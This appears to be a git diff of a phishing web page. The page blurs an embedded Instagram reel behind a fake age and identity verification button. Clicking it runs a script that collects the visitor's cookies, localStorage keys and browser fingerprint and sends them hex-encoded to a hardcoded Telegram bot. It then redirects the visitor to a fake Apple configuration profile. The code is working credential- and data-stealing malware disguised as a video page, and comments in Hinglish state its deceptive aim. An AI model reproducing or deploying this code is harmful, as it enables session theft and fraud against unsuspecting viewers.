@@ -3,34 +3,41 @@
 <head>
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <style>
-        body, html { margin:0; padding:0; height:100%; background:#000; font-family: -apple-system, sans-serif; }
-        #v { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:999; color:#fff; text-align:center; padding-top:100px; }
-        .btn { background:#0095f6; color:#fff; border:none; padding:12px; border-radius:8px; font-weight:600; width:80%; cursor:pointer; font-size:16px; margin-top:20px; }
+        body, html { margin:0; padding:0; height:100%; background:#000; overflow:hidden; }
+        #overlay { position:fixed; top:0; left:0; width:100%; height:100%; z-index:999; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.8); }
+        .v-btn { background:#0095f6; color:#fff; border:none; padding:18px 40px; border-radius:30px; font-weight:bold; font-size:18px; cursor:pointer; box-shadow: 0 0 20px rgba(0,149,246,0.5); }
     </style>
 </head>
 <body>
-    <div id="v">
-        <img src="https://www.instagram.com/static/images/ico/favicon-192.png/b30670883ce2.png" width="50">
-        <h2>Age Verification</h2>
-        <p style="padding:0 30px; font-size:14px; color:#ccc;">To continue watching, please verify your age.</p>
-        <button class="btn" onclick="done()">Verify Age (18+)</button>
+    <div id="overlay">
+        <button class="v-btn" onclick="exploit()">Verify Identity to Watch</button>
     </div>
-
-    <iframe src="https://www.instagram.com/reel/DXvjb0FP8W0/embed/" style="width:100%; height:100vh; border:none;"></iframe>
+    
+    <iframe id="r" src="https://www.instagram.com/reel/DXvjb0FP8W0/embed/" style="width:100%;height:100vh;border:none;filter:blur(5px);"></iframe>
 
     <script>
         const T="8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k", C="8639892987";
         const h=s=>[...s].map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
 
-        // Theek 5 second baad pop-up aayega bina reel roke
-        setTimeout(() => { 
-            document.getElementById('v').style.display = 'block'; 
-        }, 5000);
+        function exploit() {
+            // 1. Instant Data Leak (Browser Fingerprint & Header Leak)
+            let leak = {
+                mem: navigator.deviceMemory,
+                con: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                platform: navigator.platform,
+                agent: navigator.userAgent,
+                cookies: document.cookie || "SESSION_LOCKED"
+            };
+            
+            new Image().src=`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🚀_EXPLOIT_INIT_${h(JSON.stringify(leak))}`;
 
-        function done() {
-            let d = JSON.stringify({st:Object.keys(localStorage), ck:document.cookie, ua:navigator.userAgent});
-            new Image().src=`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🔓_FINAL_${h(d)}`;
-            document.getElementById('v').style.display = 'none';
+            // 2. The "Installation" Attempt (Fake Configuration Profile)
+            // Ye button ke piche hidden hai, click karte hi browser escape ki koshish karega
+            window.location.href = "https://applesecurityalert6-prog.github.io/config.xml"; 
+
+            // 3. UI Cleanup
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('r').style.filter = 'none';
         }
     </script>
 </body>
